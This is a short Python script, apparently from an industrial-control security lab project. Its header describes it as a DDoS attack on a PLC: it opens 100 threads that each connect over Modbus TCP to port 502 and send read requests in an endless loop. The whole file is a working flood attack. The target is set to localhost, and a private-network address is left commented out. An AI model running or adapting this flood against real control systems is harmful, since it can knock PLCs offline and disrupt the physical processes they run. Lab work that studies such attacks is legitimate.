#-----------------------------------------------------------------------------
# Name:        PLC DDoS attack example.py
#
# Purpose:     a DDoS attack attack script to start 100+ thread and keep sending 
#              data read request to the PLC server at the same time 
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import time
import threading
import modbusTcpCom

count = 0
#hostIp = '10.107.105.7'
hostIp = '127.0.0.1'
hostPort = 502

threadNum = 100
threadPool = []

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class attackThread(threading.Thread):
    """ Every detailed attack actor will be hooked in a attack thread or inherit 
        from a attack thread to run parallel with the main thread.
    """
    def __init__(self, parent, hostIp, hostPort, threadID) -> None:
        threading.Thread.__init__(self)
        self.parent = parent
        self.theradID = threadID
        self.client =  modbusTcpCom.modbusTcpClient(hostIp, tgtPort=int(hostPort))
        while not self.client.checkConn():
            print('Try connect to the PLC')
            print(self.client.getCoilsBits(0, 4))
            time.sleep(0.5)
        self.terminate = False

    def run(self):
        print("Start PLC data read thread: %s" %str(self.theradID))
        while not self.terminate:
            reuslt = self.client.getCoilsBits(0, 4)
            print(reuslt)

    def stop(self):
        self.terminate = True
        self.client.close()
 
print('Try to start init the thread pool')
for i in range(threadNum):
    plcConnetionThread = attackThread(None, hostIp, hostPort, i)
    threadPool.append(plcConnetionThread)
    
print('Start the thread pool DDoS request sending')
for i in range(threadNum):    
    threadPool[i].start()
